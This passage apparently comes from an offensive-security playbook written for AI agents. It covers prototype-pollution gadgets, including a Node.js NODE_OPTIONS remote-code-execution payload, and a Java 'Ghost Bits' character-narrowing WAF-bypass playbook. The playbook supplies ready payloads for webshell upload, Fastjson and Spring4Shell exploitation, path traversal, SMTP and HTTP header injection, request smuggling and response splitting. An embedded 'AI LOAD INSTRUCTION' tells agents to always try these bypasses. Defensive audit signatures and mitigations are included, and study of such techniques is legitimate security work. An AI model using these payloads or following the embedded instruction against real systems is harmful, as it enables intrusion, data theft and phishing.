| `$parent` | Scope chain manipulation | Template expressions | Sandbox bypass | Angular 1.x < 1.6 |
| `charset` | Modified charset | HTTP interceptors | Response manipulation | Angular 1.x |

Angular sandbox escapes + PP: `{{constructor.constructor('alert(1)')()}}` may work if PP disables sandbox checks.

---

## 5. VUE.JS

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `template` | `"<div v-html='\"<img src=x onerror=alert(1)>\"'></div>"` | Component creation without explicit template | XSS | Vue 2.x |
| `render` | Custom render function | Component mount | Code execution | Vue 2.x |
| `staticRenderFns` | Array of render functions | Component render | Code execution | Vue 2.x |
| `compilerOptions` | Modified compilation options | Template compilation | Various | Vue 3.x |

---

## 6. WEBPACK

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `output.library` | Modified library name | Build process | Code injection in output | Webpack 4.x–5.x |
| `output.auxiliaryComment` | Code injection via comment | Build process | XSS in built files | Webpack 4.x |
| `devtool` | `"eval"` → enables eval mode | Build process | Code execution path | Webpack 4.x–5.x |

Webpack PP is exploitable during **build time**, not runtime. Useful in CI/CD attack chains.

---

## 7. FASTIFY

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `reply.view` options | Template engine options (same as EJS/Pug gadgets) | `reply.view()` | RCE | Fastify + point-of-view |
| `rewriteUrl` | URL rewrite function | Request routing | Access control bypass | Fastify 3.x |
| `schema` | Modified validation schema | Route validation | Validation bypass | Fastify 3.x–4.x |

---

## 8. NODE.JS CORE

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `shell` | `"node"` or `"/bin/sh"` | `child_process.spawn()` without explicit shell | RCE | All Node.js |
| `NODE_OPTIONS` | `"--require /path/to/evil.js"` | `child_process.fork()` / `.spawn()` | RCE | Node.js 8+ |
| `argv0` | Malicious argument | `child_process.spawn()` | Code injection | All |
| `env` | Custom environment variables | `child_process.spawn()` without explicit env | ENV injection | All |
| `input` | Stdin data | `child_process.execSync()` | Data injection | All |
| `stdio` | Modified stdio config | `child_process.spawn()` | File descriptor manipulation | All |

```json
{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/cmdline"}}
```

---

## 9. MISCELLANEOUS LIBRARIES

### minimist (Argument Parser)

```bash
# CLI argument pollution:
node app.js --__proto__.polluted yes
# Pollutes Object.prototype.polluted = "yes"
```

Affected: minimist < 1.2.6

### yargs

Similar to minimist — CLI argument parsing can pollute prototype.

### qs (Query String Parser)

```
# URL query pollution:
?__proto__[polluted]=yes
?__proto__.polluted=yes
```

qs versions < 6.0.4 allow prototype pollution via nested brackets.

### destr (JSON Parser)

```javascript
destr('{"__proto__":{"polluted":"yes"}}')
// Older versions allow PP through JSON parsing
```

### json5

```javascript
JSON5.parse('{"__proto__":{"polluted":"yes"}}')
// Older versions may pollute prototype
```

---

## 10. GADGET SELECTION FLOWCHART

```
Identified target stack?
│
├── Server-side Node.js
│   ├── Express + template engine?
│   │   ├── EJS → outputFunctionName (highest success rate)
│   │   ├── Pug → block.type + block.val
│   │   ├── Handlebars → allowProtoMethodsByDefault + template chain
│   │   ├── Nunjucks → type: Code
│   │   └── Unknown → try EJS gadget first (most common)
│   │
│   ├── Fastify + point-of-view?
│   │   └── Same template gadgets apply via reply.view
│   │
│   ├── child_process used? (likely yes in any Node.js app)
│   │   └── shell + NODE_OPTIONS → universal Node.js RCE
│   │
│   └── No template / no child_process?
│       └── Try status/header pollution for impact demonstration
│
├── Client-side JavaScript
│   ├── jQuery?
│   │   └── $.extend(true,...) sink + innerHTML/src gadget
│   │
│   ├── Lodash?
│   │   └── _.merge/defaultsDeep sink + _.template sourceURL gadget
│   │
│   ├── Angular 1.x?
│   │   └── $interpolate + sandbox bypass
│   │
│   ├── Vue 2.x?
│   │   └── template property pollution
│   │
│   └── None of the above?
│       └── Generic DOM property pollution (src, href, innerHTML)
│
└── Build pipeline (CI/CD)
    └── Webpack output.library / devtool pollution
```


---
# Part 6: Ghost Bits Cast Attack


# SKILL: Ghost Bits / Cast Attack — Java char to byte Narrowing Playbook

> **AI LOAD INSTRUCTION**: This is a Java-only injection-enabling primitive,
> not a standalone vulnerability class. Whenever you see (1) a Java backend,
> (2) a WAF/IDS in front of it, and (3) any of {SQLi, deser RCE, file upload,
> path traversal, CRLF, request smuggling, SMTP injection} on the menu, ALWAYS
> try Ghost Bits variants of the payload before declaring it "blocked". The
> root cause is the silent loss of the high 8 bits when Java code narrows a
> 16-bit `char` to an 8-bit `byte` — the WAF sees a harmless Unicode
> character, the backend reconstructs the original ASCII attack byte. Base
> models almost never reach for this primitive.
>
> Source: Black Hat Asia 2026 talk *Cast Attack: A New Threat Posed by Ghost
> Bits in Java* by Xinyu Bai (@b1u3r), Zhihui Chen (@1ue), with contributor
> Zongzheng Zheng (@chun_springX).

## 0. RELATED ROUTING

Ghost Bits is a *bypass* primitive that re-enables payloads from many other
playbooks. Pair it with whichever attack family applies:

- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) — when a Java
  backend is suspected and WAF rules block the literal payload, this is the
  first technique to try beyond classic encoding.
- [deserialization-insecure](../deserialization-insecure/SKILL.md) — for
  Apache Commons BCEL ClassLoader and Fastjson `\u`/`\x` escape variants.
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) — Spring, Jetty,
  Undertow, Vert.x URL decoding and `%2>` hex folding.
- [upload-insecure-files](../upload-insecure-files/SKILL.md) — Tomcat
  `RFC2231Utility` `filename*` Webshell upload.
- [request-smuggling](../request-smuggling/SKILL.md) — Apache HttpClient
  `<= 4.5.9` (HTTPCLIENT-1974/1978) header CRLF.
- [crlf-injection](../crlf-injection/SKILL.md) — Angus Mail / Jakarta Mail
  SMTP injection and JDK HttpServer response splitting.
- [sqli-sql-injection](../sqli-sql-injection/SKILL.md) — Jackson `charToHex`
  table-lookup truncation hides SQL keywords inside Unicode escapes.

### Advanced Reference

Load [PAYLOAD_COOKBOOK.md](./PAYLOAD_COOKBOOK.md) when you need:

- Full byte-to-Ghost-character lookup table covering every printable ASCII
  byte 0x20–0x7E and the most useful control bytes (0x00, 0x09, 0x0A, 0x0D).
- Per-component affected version matrix and patch identifiers.
- Yaklang and Python one-liner payload generators (for `poc.HTTP`,
  `codec.Encode`, raw socket).
- "Multi-view normalization engine" pseudocode for blue-team WAF detection.


## 1. ONE-MINUTE MENTAL MODEL

Java's `char` is a **16-bit** unsigned integer (UTF-16 code unit). Almost
every wire protocol — HTTP/1.1, SMTP, Redis RESP, file paths, raw byte
streams — is **8-bit** byte oriented. The right way to bridge them is
explicit charset encoding:

```
// Correct: explicit UTF-8, multi-byte chars become multi-byte sequences
byte[] bytes = str.getBytes(StandardCharsets.UTF_8);
out.write(bytes);
```

Tons of legacy code, framework internals, and "fast path" optimizations skip
this and silently narrow:

```
// Dangerous: high 8 bits silently dropped
byte b = (byte) ch;          // 0x966A -> 0x6A
out.write(ch);               // ByteArrayOutputStream.write(int) keeps low 8 bits
dos.writeBytes(str);         // DataOutputStream loops char->byte cast
int v = ch & 0xFF;           // explicit low-byte mask
```

The lost high 8 bits are the **Ghost Bits**. They turn a multi-byte
Unicode character into a single attacker-chosen ASCII byte at the protocol
layer.

```
View A (string layer: WAF / business validation / logs)
  sees: 陪 阮 严 灵 瘍 瘊 ...   "harmless Unicode garbage, allow"
                  |
                  v       silent narrowing somewhere in the call stack
View B (byte layer: protocol / file system / parser / class loader)
  sees: j  .  %  u  \r \n ...  "executes the dangerous semantics"

The boundary is breached at the exact moment "view A" and "view B" disagree.
```

Mathematical formulation: to make View B see byte `T`, pick any
`k in 0x01..0xFF` and use:

```
c = chr((k << 8) | T)
```

That gives you **255 candidate Unicode characters per dangerous byte** —
plenty of room to dodge any signature-based blacklist.

---

## 2. THREE ROOT-CAUSE FAMILIES

The Ghost Bits umbrella covers three distinct underlying bugs. Distinguishing
them tells you both *which payload shape* to send and *what to grep for* in
source.

### Family A — Real high-bit truncation (classic Ghost Bits)

The narrowing is literal and unconditional.

```java
// Pattern A1: explicit cast
byte b = (byte) ch;

// Pattern A2: bitwise mask
int v = ch & 0xFF;
int v = ch & 255;

// Pattern A3: OutputStream.write(int) keeps low 8 bits only
out.write(ch);
baos.write(ch);

// Pattern A4: DataOutputStream.writeBytes(String) iterates chars,
//             writing low byte of each
dos.writeBytes(str);

// Pattern A5: deprecated APIs that still exist in old code
String.getBytes(int srcBegin, int srcEnd, byte[] dst, int dstBegin);
new StringBufferInputStream(str);
raf.writeBytes(str);
```

Typical impact: Tomcat `filename*`, Apache BCEL ClassLoader, Lettuce Redis
writer, SMTP CRLF in Angus Mail, HTTPCLIENT-1974 header injection.

### Family B — Bit-arithmetic folding (illegal char becomes legal)

A "fast" hex / base64 / charset decoder uses bit tricks instead of strict
range checks, so an illegal character collapses onto a legal one.

```java
// Jetty TypeUtil.fromHexDigit (simplified)
private static int fromHexDigit(char c) {
    int x = c & 0x1F;          // keep low 5 bits
    x += (c >> 6) * 25;
    x -= 16;
    return x;                  // expected 0..15, but no range check
}
```

Worked example: feed `>` (0x3E):

```
0x3E & 0x1F = 0x1E = 30
(0x3E >> 6) * 25 = 0
30 + 0 - 16 = 14 = 0xE
```

So `%2>` is silently parsed as `%2E` = `.`. The same algebra makes `%2^`,
`%2~` etc. equivalent to other hex digits.

Typical impact: Openfire CVE-2023-32315, GeoServer CVE-2024-36401, generic
URL-decode WAF bypass.

### Family C — Lax Unicode normalization

The decoder accepts Unicode characters that happen to be classified as
"digit" or that map to a hex value via a `& 0xFF` lookup — even though they
were never meant to participate in protocol parsing.

```java
// Fastjson: too permissive
Character.digit(c, 16);   // accepts Thai, Punjabi, fullwidth digits

// Jackson: index by low 8 bits into an ASCII-only table
return sHexValues[ch & 0xff];

// Generic: fullwidth normalization
// '2' (U+FF12) -> '2', 'e' (U+FF45) -> 'e'
```

Typical impact: Fastjson `\u` and `\x` escape bypass, fullwidth URL-encoded
path traversal, Jackson `charToHex` SQLi smuggling.

---

## 3. CHARACTER GENERATOR

Build any Ghost Bits character on the fly. This is the single function every
agent should keep in mind:

```python
# Python
def ghost(target_byte: int, k: int = 1) -> str:
    """Return a Unicode char whose low 8 bits equal target_byte."""
    return chr(((k & 0xFF) << 8) | (target_byte & 0xFF))

# 255 candidates per byte, e.g. for '.' (0x2E):
candidates = [ghost(0x2E, k) for k in range(1, 256)]
# 阮(U+962E), Ⱦ?-prefixed-..., etc.
```

```yak
// Yaklang (for poc.HTTP / fuzz)
func ghost(targetByte, k) {
    return string(rune(((k & 0xFF) << 8) | (targetByte & 0xFF)))
}
ghostJ = ghost(0x6A, 0x96)   // returns "陪"
```

Selection guidance:

- Avoid surrogate range `0xD800..0xDFFF` (high byte 0xD8..0xDF) — those are
  not valid scalar values and will be replaced by the JVM string decoder
  before reaching the narrowing site, defeating the bypass.
- Prefer characters that survive the application's own charset round-trip
  (Latin-Extended, CJK Unified Ideographs, Enclosed CJK Letters and Months,
  Hangul). If the request body uses UTF-8, these all encode cleanly into
  multi-byte sequences that no WAF rule recognizes as `.`, `/`, `j`, etc.
- Rotate `k` between requests so signature based learning cannot pin a single
  character to a single attack.

---

## 4. DANGEROUS-BYTE TO GHOST-CHARACTER MAP

Compact red-team weaponization table. For every byte the attacker actually
needs, one verified Unicode char is given; substitute another `k` if the WAF
later learns the example.

| Target byte | Hex  | Used for                              | Ghost char | Code point |
|-------------|------|---------------------------------------|------------|------------|
| `\t`        | 0x09 | header folding, parser confusion      | `ĉ`        | U+0109     |
| `\n`        | 0x0A | CRLF injection, log injection         | `瘊`       | U+760A     |
| `\r`        | 0x0D | CRLF injection, request smuggling     | `瘍`       | U+760D     |
| ` `         | 0x20 | header break, command separator       | `Ġ`        | U+0120     |
| `"`         | 0x22 | string break in JSON / quoted-printable | `Ģ`     | U+0122     |
| `%`         | 0x25 | URL encoding prefix, second decode    | `严`       | U+4E25     |
| `&`         | 0x26 | parameter separator                   | `Ȧ`        | U+0226     |
| `'`         | 0x27 | SQL string break                      | `ȧ`        | U+0227     |
| `(`         | 0x28 | EL/SpEL/OGNL syntax                   | `Ȩ`        | U+0228     |
| `)`         | 0x29 | EL/SpEL/OGNL syntax                   | `ȩ`        | U+0229     |
| `.`         | 0x2E | path traversal, extension             | `阮`       | U+962E     |
| `/`         | 0x2F | path separator                        | `丯`       | U+4E2F     |
| `0`         | 0x30 | hex digit construction                | `丰`       | U+4E30     |
| `1`         | 0x31 | hex digit construction                | `失`       | U+5931     |
| `2`         | 0x32 | hex digit construction                | `甲`       | U+7532     |
| `3`         | 0x33 | hex digit construction                | `耳`       | U+8033     |
| `;`         | 0x3B | command separator, header continuation | `Ȼ`       | U+023B     |
| `<`         | 0x3C | XSS / XML tag start                   | `ȼ`        | U+023C     |
| `=`         | 0x3D | parameter / header value              | `Ƚ`        | U+023D     |
| `>`         | 0x3E | XSS / XML tag end                     | `Ⱦ`        | U+023E     |
| `@`         | 0x40 | Fastjson `@type`, mail address        | `ŀ`        | U+0140     |
| `a`         | 0x61 | keyword `class`, alphabet             | `ᙡ`        | U+1661     |
| `c`         | 0x63 | keyword `class`, `cmd`                | `㹣`       | U+3E63     |
| `e`         | 0x65 | hex digit                             | `来`       | U+6765     |
| `j`         | 0x6A | extension `.jsp`                      | `陪`       | U+966A     |
| `l`         | 0x6C | keyword `class`, `closure`            | `౬`        | U+0C6C     |
| `n`         | 0x6E | keyword `Runtime`, `union`            | `陮`       | U+966E     |
| `s`         | 0x73 | keyword `class`, `select`             | `⑳`        | U+2473     |
| `t`         | 0x74 | keyword `Runtime`, `type`             | `Ŵ`        | U+0174     |
| `u`         | 0x75 | `\u` escape introducer                | `灵`       | U+7075     |

Workflow tip: keep the ASCII `Ŀ`, `ȧ`, `ȼ`, etc. variants for tight HTTP
header contexts (one byte UTF-8 expansion stays smaller); use CJK like `阮`,
`陪`, `严` when you want to bias the WAF "this is just text" classifier.

---

## 5. PER-COMPONENT PAYLOAD RECIPES

Every recipe shows the dual view: what the WAF inspects vs. what the backend
actually executes. This is the only reliable way to explain *why* the payload
goes through.

### 5.1 Tomcat `RFC2231Utility` — file upload Webshell (Family A)

Trigger: any endpoint that accepts multipart upload and Tomcat parses
`Content-Disposition: ... filename*=UTF-8''...`. Tomcat's RFC2231 decoder
casts each non-percent character directly to byte, dropping the high 8 bits.

Payload:

```
Content-Disposition: attachment; filename*=UTF-8''1.陪sp
```

| Stage                  | Filename it sees         |
|------------------------|--------------------------|
| WAF / extension filter | `1.陪sp` (not `.jsp`, allow) |
| Tomcat RFC2231 decoder | `陪` -> low byte 0x6A -> `j` |
| File system            | `1.jsp`                  |

Combine with traversal characters from section 4 (`阮`, `丯`) when the upload
target directory is fixed but the application accepts a `filename*`.

### 5.2 Apache Commons BCEL — ClassLoader RCE (Family A)

Trigger: any sink that resolves a class name through `BCEL` (`$$BCEL$$...`)
or any code that decodes BCEL via the `JavaReader` -> `ByteArrayOutputStream`
loop.

Vulnerable shape:

```java
ByteArrayOutputStream bos = new ByteArrayOutputStream();
JavaReader jr = new JavaReader(new CharArrayReader(userChars));
while ((ch = jr.read()) >= 0) {
    bos.write(ch);     // low 8 bits only
}
```

Attack: wrap each byte of the malicious BCEL bytecode into a Unicode
character whose low 8 bits equal that byte. The decoded byte stream is a
valid BCEL class; the WAF sees a long blob of CJK text without `$$BCEL$$`
keywords or class signatures.

| View | Content |
|------|---------|
| WAF  | `$$BCEL$$` followed by random looking CJK |
| BCEL | standard BCEL class file bytes → JVM defineClass → RCE |

Defense for blue team: a WAF inspecting BCEL must replicate the
`bos.write(ch)` semantics on each character before pattern matching.

### 5.3 Jackson `charToHex` — SQLi smuggling (Family C)

Trigger: any Jackson-parsed JSON field whose value is later embedded in SQL
or another parser. Jackson resolves `\uXXXX` digits via:

```java
private static final int[] sHexValues = new int[128];
public static int charToHex(int ch) {
    return sHexValues[ch & 0xFF];   // mask first, lookup second
}
```

Any non-ASCII character whose low 8 bits land on a populated index returns
that hex digit. The WAF sees gibberish; Jackson reconstructs an ASCII payload.

Payload (smuggle the digit `1` for a UNION column count):

```json
{"q": "\u丰丰耳失 union select 1,2,3 -- "}
```

| View    | Content                                             |
|---------|-----------------------------------------------------|
| WAF     | `\u丰丰耳失 union select ...` (no leading digit)    |
| Jackson | `\u0031 union select 1,2,3-- ` -> `1 union select…` |

Pair with [sqli-sql-injection](../sqli-sql-injection/SKILL.md) for the
downstream UNION / boolean / time-based payload templates.

### 5.4 Fastjson — `\u` and `\x` escape bypass (Families B + C)

Two independent surfaces:

(a) `\u` escape — `Character.digit(c, 16)` accepts Unicode digit categories
beyond ASCII (Thai `๐-๙` U+0E50..U+0E59, Punjabi `੦-੯` U+0A66..U+0A6F,
fullwidth `０-９` U+FF10..U+FF19).

```json
{"\u４_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
```

WAF view: `\u４_type` (no `@type` literal). Fastjson normalizes fullwidth
`４` to `4`, then handles `_` via the `\x` shortcut below, yielding `@type`.

(b) `\x` escape — Fastjson computes `digits[x1] * 16 + digits[x2]`. An
illegal hex character returns the default value 0.

```
\x4_   ->   '4'(=4) * 16 + '_'(=0) = 0x40 = '@'
```

```json
{"\x4_type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x"}
```

| View     | Field name |
|----------|------------|
| WAF      | `\x4_type` (not `@type`) |
| Fastjson | `@type` -> JdbcRowSetImpl autotype gadget triggers |

### 5.5 Spring / Jetty / Undertow / Vert.x — URL decoding (Families A + B)

Two combinable tricks:

Trick 1 — Family A character substitution in path or query:

```
/api/v1/data?file=阮丯阮丯etc丯passwd
                = ../../etc/passwd at the byte layer
```

Trick 2 — Family B `%2>` folding when Jetty's `TypeUtil.fromHexDigit` is in
the chain:

```
/setup/setup-s/%2>%2>/log.jsp
                = /setup/setup-s/../log.jsp after decode
```

Either alone bypasses most signature WAFs; combined they survive even
"normalized then matched" rules that only see ASCII percent triplets.

Spring CVE-2025-41242 chain (`StringUtils.uriDecode` patched in PR #34673):

```
input :  阮严灵丰丰甲来
       (.)(%)(u)(0)(0)(2)(e)
narrow:  .%u002e
decode:  ..
result:  arbitrary file read via path traversal
```

| Stage           | Path           |
|-----------------|----------------|
| Spring `isInvalidPath()` | `.%u002e` — no literal `..`, allow |
| Backend file resolution  | `..` after `%u002e` decode → traversal |

### 5.6 Angus Mail / Jakarta Mail — SMTP injection (Family A)

Trigger: any application that builds SMTP envelopes or headers from
user-controlled strings. Internal `ASCIIUtility` does:

```java
byte b = (byte) ch;           // 16-bit char silently narrowed
```

Smuggle CRLF as `瘍瘊`:

```
hacker@evil.com瘍瘊Subject: Password reset code瘍瘊To: target@victim.com瘍瘊瘍瘊Your code is 1234
```

| View | What it parses |
|------|----------------|
| Application validation | a single `From` value containing odd CJK |
| SMTP server            | five separate header lines + body, fully spoofed |

Real impact pattern: Jira-style (CVE-2025-57733) password-reset hijacking,
Confluence domain allowlist bypass — pair with
[crlf-injection](../crlf-injection/SKILL.md) for non-mail CRLF reuse.

### 5.7 Apache HttpClient `<= 4.5.9` — request smuggling (Family A)

HTTPCLIENT-1974 / HTTPCLIENT-1978: header values pass through
`OutputStreamWriter` plus a narrow-cast write that emits raw `\r\n` for
`\u760D\u760A`.

```
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0\r\n\r\nGET /public HTTP/1.1
```

| Hop | Sees |
|-----|------|
| Front proxy / WAF | one request with a long `X-Auth-Token` |
| Origin            | two requests; the second is an admin POST |

Cross-reference [request-smuggling](../request-smuggling/SKILL.md) for
chosen-prefix attacks once the desync is confirmed.

### 5.8 JDK HttpServer — response splitting (CVE-2026-21933, Family A)

Reflection of user input into a response header passes through
`com.sun.net.httpserver` writers that low-byte-cast each char.

Payload (URL parameter or upstream header):

```
Custom: Cu瘍瘊Content-Type: text/html瘍瘊Content-Length: 33瘍瘊瘍瘊<script>alert(1)</script>
```

Server emits two logical responses; the second carries an attacker-chosen
body. Escalates to stored XSS, cache poisoning, and SSO redirect chains.

### 5.9 Other affected components

Same Family A primitive, different sink:

- **Lettuce (Redis client)** — command injection by smuggling `\r\n` into
  RESP frames; chain to arbitrary `CONFIG SET dir` + `SAVE` for SSRF-to-RCE.
- **Jodd `FileNameUtil`** — path traversal via `阮` and `丯` because its
  internal write loop narrows.
- **XMLWriter** — tag-name injection when an attribute or text node value is
  pushed through a low-byte writer; XXE / XSS pivot.
- **ActiveJ HTTP** — CRLF injection identical in shape to 5.7 / 5.8.
- **Vert.x HTTP body parser** — Family A in `MultipartParser`.

See [PAYLOAD_COOKBOOK.md](./PAYLOAD_COOKBOOK.md) for affected-version
matrix and full per-component payload skeletons.

---

## 6. KNOWN-CVE BYPASS RECIPES

Use these *exactly when the corresponding CVE is patched but a WAF still
fronts the service*. Each Payload below shifts the original ASCII attack into
a form that survives string-based WAF rules.

### Openfire CVE-2023-32315 — auth bypass (Family B)

Original public bypass:

```
GET /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

Ghost Bits / `%2>` folding bypass (much harder to signature):

```
GET /setup/setup-s/%2>%2>/%2>%2>/log.jsp
```

Each `%2>` collapses through Jetty's lax hex into `%2E` = `.`, yielding the
same `../../` traversal without ever emitting `..` or `%2e` to the WAF.

### GeoServer CVE-2024-36401 — RCE via `Runtime` keyword (Family B)

Public WAF rules typically block `Runtime`. Inject one folded character:

```
Ru%6>time
```

Decoder math: `%6>` -> `%6E` -> `n`. The expression evaluator now sees
`Runtime`, the WAF never did.

### Spring4Shell CVE-2022-22965 — class loader chain (Family A)

Required parameter prefix `class.module.classLoader...`. WAFs block the
literal `class`. Substitute via low-byte chars:

```
Content-Disposition: form-data; name*="㹣౬ᙡ⑳⑳.module.classLoader.resources..."
```

| Component | Char  | Code point | Low byte |
|-----------|-------|------------|----------|
| `c`       | `㹣`  | U+3E63     | 0x63     |
| `l`       | `౬`  | U+0C6C     | 0x6C     |
| `a`       | `ᙡ`  | U+1661     | 0x61     |
| `s`       | `⑳`  | U+2473     | 0x73     |
| `s`       | `⑳`  | U+2473     | 0x73     |

Springs's parameter-name resolver narrows back to `class`.

### Spring CVE-2025-41242 — arbitrary file read (Family A + Family B mix)

Already demonstrated in 5.5 above. Payload `阮严灵丰丰甲来` ->
`.%u002e` -> `..` after decode-after-validation.

### Jakarta Mail CVE-2025-57733 — Jira-style mail hijack (Family A)

```
to=victim@org.com瘍瘊Subject: Reset code瘍瘊To: attacker@evil.com瘍瘊瘍瘊Your code is 1234
```

The mail leaves the company SMTP server with valid SPF / DKIM / DMARC, but
its `To:` and `Subject:` are attacker-chosen — high-fidelity phishing.

---

## 7. DETECTION DECISION TREE

Use this when triaging a target. The point is to avoid Ghost Bits when it
cannot help and to *always* try it when the preconditions hold.

```
Is the backend Java? (Server header, error page, JSESSIONID, .do/.action,
                      WebGoat-style stack trace, X-Powered-By, X-Frame-Options
                      with Tomcat default values)
├── No  -> stop, Ghost Bits does not apply
└── Yes
    │
    ├── Is there a WAF / IDS or input filter blocking your literal payload?
    │   ├── No  -> use the literal payload; Ghost Bits is overkill
    │   └── Yes -> continue
    │
    ├── Which sink are you targeting?
    │   ├── File upload via multipart  -> recipe 5.1 (Tomcat filename*)
    │   ├── JSON deserialization       -> recipes 5.3 (Jackson) / 5.4 (Fastjson)
    │   ├── Class loader / BCEL ref    -> recipe 5.2
    │   ├── URL path / parameter       -> recipe 5.5 + Family B `%2>`
    │   ├── Header reflection          -> recipes 5.7 / 5.8
    │   ├── Mail send                  -> recipe 5.6
    │   └── Redis / RESP / XML / RPC   -> recipe 5.9
    │
    ├── Probe with a single non-destructive substitution first
    │   (replace ONE character with its Ghost variant; observe response
    │    diff: status code, length, header echo, error message, time)
    │
    └── If observable difference appears -> escalate by substituting all
                                            blocked characters and chain
                                            through the linked playbook.
```

---

## 8. SAST / CODE-AUDIT SIGNATURES

Three priority tiers when reviewing Java source. Search across all your
project repos, all dependencies you can shade, and the `lib/` of any
deployed appliance.

### Tier 1 — direct narrowing (Family A)

```
\(byte\)\s*\w+
&\s*0[xX][fF][fF]
&\s*255
\.write\(\s*[a-zA-Z_]\w*\s*\)         # OutputStream.write(int)
writeBytes\s*\(
StringBufferInputStream
String\.getBytes\s*\(\s*int
RandomAccessFile.*writeBytes
```

### Tier 2 — lax hex / digit decoding (Families B + C)

```
Character\.digit\s*\(
fromHexDigit
convertHexDigit
fromHex\s*\(
uriDecode
URLDecoder\.decode
sHexValues\[
& 0x1F\)\s*\+\s*\(.*>>.*\) \* 25
```

### Tier 3 — high-risk wrappers and reachability

```
RFC2231                # Tomcat / mail filename* parsing
JavaReader             # BCEL ClassLoader reachable
ASCIIUtility           # Jakarta Mail / Angus Mail
LineParser             # HttpClient header parser
ChunkedDecoder         # request smuggling adjacent
charToHex              # Jackson
encodeUTF8             # candidate for char->byte writer
```

Per-finding triage applies the **five-dimension risk model**:

| Dimension     | Higher risk if                                                     |
|---------------|--------------------------------------------------------------------|
| Input control | HTTP param, header, filename, JSON key, mail address               |
| Validation    | a deny/allow list runs *before* the narrowing site                 |
| Narrowing time | conversion happens after security check                           |
| Syntax target | result enters URL / SMTP / HTTP / Redis / file system / SQL grammar |
| Re-decoding   | Base64, URL-decode, JSON unescape, `%u`, etc. happen later         |

Risk formula:

```
attacker-controlled  +  check-before-narrow  +  result-in-protocol-syntax
                                              +  later-redecoding
                              = HIGH SEVERITY
```

---

## 9. DIFFERENTIAL TESTING WORKFLOW

A reproducible, black-box procedure to find new Ghost Bits sinks (red team)
or to validate a fix (blue team).

```
1. Pick one dangerous byte T at a time (e.g. 0x2E for '.').

2. Generate the candidate set:
       C = { chr((k << 8) | T) for k in 1..255 }
   Drop surrogates 0xD8XX..0xDFXX.

3. For each candidate c in C:
       a. Send a benign request with c at the chosen position.
       b. Send the same request with literal T at the same position.
       c. Compare four observables:
            - status code
            - response body length
            - response body content hash (or diff)
            - server-side log line (if available)

4. If any candidate produces a response equivalent to T but differs from a
   "neutral" character (e.g. 'X'), you have found a narrowing sink.

5. Repeat for the next T in your priority list:
       0x2E ('.'), 0x2F ('/'), 0x25 ('%'), 0x40 ('@'),
       0x0D ('\r'), 0x0A ('\n'), 0x6A ('j'), 0x73 ('s'),
       0x6C ('l'), 0x61 ('a'), 0x63 ('c'), 0x22 ('"'), 0x27 (''')

6. Cluster sinks by component (response Server header, error stack) — one
   sink usually implies the whole framework version is vulnerable.
```

This workflow is intentionally protocol-agnostic; the same loop works on a
file uploader, a search endpoint, a mail composer, or a Redis-backed cache.

---

## 10. DEFENSE AWARENESS

Five layers, all needed; any single one is bypassable in isolation.

| Layer            | Action                                                               |
|------------------|----------------------------------------------------------------------|
| Source code      | Ban hand-written `(byte) ch`, `& 0xFF`, `out.write(ch)`, `writeBytes`. Use `getBytes(StandardCharsets.UTF_8)` or strict ASCII allowlist for protocol fields. |
| Decoder          | Reject illegal input. Never default-fold an unknown hex / Unicode digit / Base64 character to 0 or to its low 8 bits. |
| Validation order | Always normalize first, then validate. Specifically: strict decode → Unicode NFC/NFKC → protocol normalize (URL `..` resolution, `File.getCanonicalPath`) → security check → execute. |
| Protocol field   | Use strict allowlists per field (HTTP header value, SMTP envelope, URL path, filename, JSON key, XML tag). Reject CR/LF in any header or address. |
| WAF / IDS        | Run a *multi-view* normalizer. Always inspect the original string AND the `(char) & 0xFF` view AND the URL-decoded view AND the Unicode-NFKC view. Alert when any view contains a dangerous semantic the original lacked. |

Blue-team smell tests:

- Logs contain CJK / Latin-Extended characters at positions where the
  protocol grammar expects ASCII (filename, header value, mail address).
- The HEX dump of a request contains bytes outside `0x20..0x7E` adjacent to
  protocol delimiters.
- A pen-test or scanner reports a "weird 200" that the security monitoring
  did not flag — Ghost Bits is the most common 2025-2026 cause for that
  pattern in Java stacks.

---

## 11. QUICK REFERENCE — KEY PAYLOADS

```text
# Ghost char generator
ghost(T, k) = chr(((k & 0xFF) << 8) | (T & 0xFF))     # avoid k in 0xD8..0xDF

# Tomcat filename* webshell upload
Content-Disposition: attachment; filename*="UTF-8''shell.陪sp"     # → shell.jsp

# BCEL ClassLoader bypass (concept)
$$BCEL$$<each-byte-of-class-file-wrapped-in-a-Unicode-char>

# Jackson SQLi smuggling
{"q":"\u丰丰耳失 union select 1,2,3-- "}                          # → "1 union select…"

# Fastjson @type smuggling
{"\x4_type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x"}

# Spring URL decode + Jetty %2> folding
GET /api/data?file=阮丯阮丯etc丯passwd
GET /setup/setup-s/%2>%2>/log.jsp
GET /api?cmd=Ru%6>time

# Spring4Shell name* class smuggling
Content-Disposition: form-data; name*="㹣౬ᙡ⑳⑳.module.classLoader..."

# Spring CVE-2025-41242 path read
GET /resources/阮严灵丰丰甲来/secret.properties                    # → ../%u002e

# Angus Mail / Jira mail hijack
From: hacker@evil.com瘍瘊Subject: Reset瘍瘊To: victim@org.com瘍瘊瘍瘊Your code is 1234

# Apache HttpClient ≤4.5.9 smuggling
X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0\r\n\r\nGET /public HTTP/1.1

# JDK HttpServer response splitting (CVE-2026-21933)
?ref=Cu瘍瘊Content-Type:text/html瘍瘊Content-Length:33瘍瘊瘍瘊<script>alert(1)</script>

# SAST first-pass grep
grep -RnE '\(byte\)\s*\w+|& 0[xX][fF][fF]|writeBytes|baos\.write\(\w+\)' src/
grep -RnE 'Character\.digit|fromHexDigit|charToHex|uriDecode' src/
```

---

## REFERENCES

- Black Hat Asia 2026 — *Cast Attack: A New Threat Posed by Ghost Bits in
